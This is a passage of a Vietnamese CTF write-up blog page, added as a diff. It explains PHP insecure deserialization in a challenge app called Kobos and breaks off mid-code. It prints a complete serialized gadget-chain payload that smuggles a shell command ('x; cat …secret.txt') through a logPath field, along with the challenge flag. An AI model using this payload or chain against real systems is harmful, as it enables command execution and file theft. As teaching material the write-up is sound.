@@ -1,0 +1,309 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP Deserialize | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="1. Tổng quanTrong bài Kobos, backend dùng PHP 8.2 + CodeIgniter 4. Challenge có một cụm chức năng admin dùng để backup, upload và đọc lại log thao tác truyện&#x2F;chapter. Điểm yếu nằm ở việc backend">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP Deserialize">
+<meta property="og:url" content="https://elliotbigfan.github.io/2026/07/14/2026/ctf/test/wu3/index.html">
+<meta property="og:site_name" content="H00d1eBl4ck">
+<meta property="og:description" content="1. Tổng quanTrong bài Kobos, backend dùng PHP 8.2 + CodeIgniter 4. Challenge có một cụm chức năng admin dùng để backup, upload và đọc lại log thao tác truyện&#x2F;chapter. Điểm yếu nằm ở việc backend">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/test/poster.avif">
+<meta property="article:published_time" content="2026-07-14T09:04:19.000Z">
+<meta property="article:modified_time" content="2026-07-14T09:36:35.954Z">
+<meta property="article:author" content="H00d1eBl4ck">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Training">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/test/poster.avif"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PHP Deserialize",
+  "url": "https://elliotbigfan.github.io/2026/07/14/2026/ctf/test/wu3/",
+  "image": "https://elliotbigfan.github.io/img/ctf/test/poster.avif",
+  "datePublished": "2026-07-14T09:04:19.000Z",
+  "dateModified": "2026-07-14T09:36:35.954Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "H00d1eBl4ck",
+      "url": "https://elliotbigfan.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2026/07/14/2026/ctf/test/wu3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP Deserialize',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/test/poster.avif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP Deserialize</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP Deserialize</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-07-14T09:04:19.000Z" title="Created 2026-07-14 16:04:19">2026-07-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-07-14T09:36:35.954Z" title="Updated 2026-07-14 16:36:35">2026-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Training/">Training</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>10mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="1-Tong-quan"><a href="#1-Tong-quan" class="headerlink" title="1. Tổng quan"></a>1. Tổng quan</h2><p>Trong bài Kobos, backend dùng PHP 8.2 + CodeIgniter 4. Challenge có một cụm chức năng admin dùng để backup, upload và đọc lại log thao tác truyện&#x2F;chapter.</p>
+<p>Điểm yếu nằm ở việc backend đọc nội dung log rồi gọi trực tiếp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$log</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>Nếu attacker kiểm soát được nội dung log, attacker có thể đưa vào một object PHP đã serialize sẵn. Khi <code>unserialize()</code> dựng lại object đó, các magic method như <code>__destruct()</code> có thể tự chạy và dẫn tới gọi hàm nguy hiểm.</p>
+<p>Trong bài này, gadget chain chính là:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ComicLogger::getLogsByName()</span><br><span class="line">-&gt; unserialize($log[2])</span><br><span class="line">-&gt; object App\Libraries\Chapter được khôi phục</span><br><span class="line">-&gt; cuối request, Chapter::__destruct() tự chạy</span><br><span class="line">-&gt; Chapter::delete()</span><br><span class="line">-&gt; $this-&gt;comic-&gt;remove($this-&gt;chapter_id)</span><br><span class="line">-&gt; App\Libraries\System::remove()</span><br><span class="line">-&gt; system(&quot;rm -f $this-&gt;logPath&quot;)</span><br><span class="line">-&gt; command injection qua logPath</span><br><span class="line">-&gt; đọc /var/www/html/secret.txt</span><br></pre></td></tr></table></figure>
+
+<p>Flag local rebuild nằm ở:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/secret.txt</span><br></pre></td></tr></table></figure>
+
+<p>và nội dung được seed trong entrypoint:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CBJS&#123;Php_D3c3NTRaL1Z3d_47581926&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-PHP-serialize-unserialize-la-gi"><a href="#2-PHP-serialize-unserialize-la-gi" class="headerlink" title="2. PHP serialize&#x2F;unserialize là gì?"></a>2. PHP serialize&#x2F;unserialize là gì?</h2><p>PHP có cơ chế biến object thành chuỗi bằng <code>serialize()</code> và dựng lại object từ chuỗi bằng <code>unserialize()</code>.</p>
+<p>Ví dụ object đơn giản:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br></pre></td></tr></table></figure>
+
+<p>Output có dạng:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ý nghĩa nhanh:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;  -&gt; object class User, tên class dài 4 ký tự</span><br><span class="line">1           -&gt; có 1 property</span><br><span class="line">s:4:&quot;name&quot;  -&gt; property tên name</span><br><span class="line">s:5:&quot;admin&quot; -&gt; giá trị string admin</span><br></pre></td></tr></table></figure>
+
+<p>Với namespace, tên class đầy đủ được đưa vào payload. Ví dụ:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Libraries</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chapter</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>khi serialize sẽ có tên class đầy đủ:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">App\Libraries\Chapter</span><br></pre></td></tr></table></figure>
+
+<p>Vì vậy payload của bài này bắt đầu bằng:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:21:&quot;App\Libraries\Chapter&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>App\Libraries\Chapter</code> dài 21 ký tự, nên số <code>21</code> phải khớp. Nếu sửa tên class hoặc namespace mà không sửa độ dài, <code>unserialize()</code> sẽ lỗi.</p>
+<h2 id="3-Vi-sao-unserialize-nguy-hiem"><a href="#3-Vi-sao-unserialize-nguy-hiem" class="headerlink" title="3. Vì sao unserialize nguy hiểm?"></a>3. Vì sao unserialize nguy hiểm?</h2><p><code>unserialize()</code> không chỉ đọc dữ liệu như JSON. Nó dựng lại object PHP thật, với class, property và lifecycle của object đó.</p>
+<p>Nếu class có magic method như:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br><span class="line"><span class="title function_ invoke__">__call</span>()</span><br></pre></td></tr></table></figure>
+
+<p>thì các method này có thể tự chạy trong một số tình huống.</p>
+<p>Trong bài Kobos, class <code>Chapter</code> có <code>__destruct()</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Nghĩa là chỉ cần object <code>Chapter</code> được tạo ra rồi request kết thúc, PHP sẽ tự gọi destructor. Đây là điểm kích hoạt gadget chain.</p>
+<p>Checklist khi thấy PHP unserialize trong CTF:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Tìm unserialize()</span><br><span class="line">Xác định input có do user kiểm soát không</span><br><span class="line">Tìm class có magic method</span><br><span class="line">Tìm method gọi system/exec/file/delete/include/query</span><br><span class="line">Ghép object sao cho magic method tự gọi đến sink</span><br><span class="line">Tạo chuỗi serialize đúng namespace/property</span><br><span class="line">Trigger endpoint gọi unserialize</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-Phan-tich-source-Kobos"><a href="#4-Phan-tich-source-Kobos" class="headerlink" title="4. Phân tích source Kobos"></a>4. Phân tích source Kobos</h2><p>Route admin liên quan nằm ở:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobos/app/app/Config/Routes.php</span><br></pre></td></tr></table></figure>
+
+<p>Các endpoint chính:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routes</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;store-logs&#x27;</span>, <span class="string">&#x27;ComicLogger::storeLogs&#x27;</span>);</span><br><span class="line"><span class="variable">$routes</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;get-logs&#x27;</span>, <span class="string">&#x27;ComicLogger::getLogsByName&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Hai endpoint này nằm trong group protected bởi JWT, và controller admin sẽ kiểm tra role admin.</p>
+<h3 id="4-1-Upload-log"><a href="#4-1-Upload-log" class="headerlink" title="4.1. Upload log"></a>4.1. Upload log</h3><p>File:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobos/app/app/Controllers/ComicLogger.php</span><br></pre></td></tr></table></figure>
+
+<p>Method upload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">storeLogs</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFile</span>(<span class="string">&#x27;logFile&#x27;</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$logData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getTempName</span>());</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logger = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="string">&#x27;load&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientName</span>() === <span class="string">&#x27;borrow_log.txt&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;logPath = <span class="string">&#x27;/var/www/html/writable/logs/new_borrow_log.txt&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;logPath = <span class="string">&#x27;/var/www/html/writable/logs/&#x27;</span> . <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientName</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logger-&gt;logPath, <span class="variable">$logData</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Điểm quan trọng:</p>
+<ul>
+<li>Admin có thể upload file log tùy ý.</li>
+<li>Nội dung file được ghi gần như nguyên vẹn vào <code>writable/logs/&lt;filename&gt;</code>.</li>
+<li>Mime type được cho phép gồm <code>text/plain</code> và <code>application/octet-stream</code>.</li>
+</ul>
+<h3 id="4-2-Load-log-va-unserialize"><a href="#4-2-Load-log-va-unserialize" class="headerlink" title="4.2. Load log và unserialize"></a>4.2. Load log và unserialize</h3><p>Method đọc log:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getLogsByName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$json</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getJSON</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$json</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logger = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="string">&#x27;load&#x27;</span>);</span><br><span class="line">    <span class="variable">$logData</span> = <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">logLoad</span>(<span class="variable">$name</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$logData</span> <span class="keyword">as</span> <span class="variable">$logEntry</span>) &#123;</span><br><span class="line">        <span class="variable">$log</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\t&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$logEntry</span>));</span><br><span class="line">        <span class="variable">$date</span> = <span class="variable">$log</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$action</span> = <span class="variable">$log</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$comicStorage</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$log</span>[<span class="number">2</span>]);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Log format mong đợi là TSV:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Timestamp&lt;TAB&gt;Action&lt;TAB&gt;Message</span><br></pre></td></tr></table></figure>
+
+<p>Dòng đầu là header và bị bỏ qua trong <code>Logger::logLoad()</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_shift</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Vì vậy payload cần đặt từ dòng thứ hai, ở cột thứ ba.</p>
+<p>Nội dung:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Timestamp	Action	Message</span><br><span class="line">2026-07-10 08:00:19	add	O:21:&quot;App\Libraries\Chapter&quot;:4:&#123;s:5:&quot;comic&quot;;O:20:&quot;App\Libraries\System&quot;:2:&#123;s:4:&quot;host&quot;;s:9:&quot;localhost&quot;;s:7:&quot;logPath&quot;;s:31:&quot;x; cat /var/www/html/secret.txt&quot;;&#125;s:10:&quot;chapter_id&quot;;s:5:&quot;pwned&quot;;s:5:&quot;title&quot;;s:5:&quot;pwned&quot;;s:5:&quot;stock&quot;;i:10;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-Gadget-chain"><a href="#5-Gadget-chain" class="headerlink" title="5. Gadget chain"></a>5. Gadget chain</h2><h3 id="5-1-Class-Chapter"><a href="#5-1-Class-Chapter" class="headerlink" title="5.1. Class Chapter"></a>5.1. Class Chapter</h3><p>File:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobos/app/app/Libraries/Chapter.php</span><br></pre></td></tr></table></figure>
+
+<p>Code chính:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$comic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chapter_id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$stock</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stock = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;comic != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;comic-&gt;<span class="title function_ invoke__">remove</span>(<span class="variable">$this</span>-&gt;chapter_id);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[Chapter Delete] &quot;</span> . <span class="variable language_">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Khi object <code>Chapter</code> bị destroy:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct() -&gt; delete()</span><br></pre></td></tr></table></figure>
+
+<p>Nếu property <code>$comic</code> không null, nó gọi:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;comic-&gt;<span class="title function_ invoke__">remove</span>(<span class="variable">$this</span>-&gt;chapter_id);</span><br></pre></td></tr></table></figure>
+
+<p>Ta có thể đặt <code>$comic</code> là object <code>App\Libraries\System</code>.</p>
+<h3 id="5-2-Class-System"><a href="#5-2-Class-System" class="headerlink" title="5.2. Class System"></a>5.2. Class System</h3><p>File:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobos/app/app/Libraries/System.php</span><br></pre></td></tr></table></figure>
+
+<p>Code chính:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">System</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logPath</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"><span class="variable">$chapterId</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -f <span class="subst">$this</span>-&gt;logPath&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 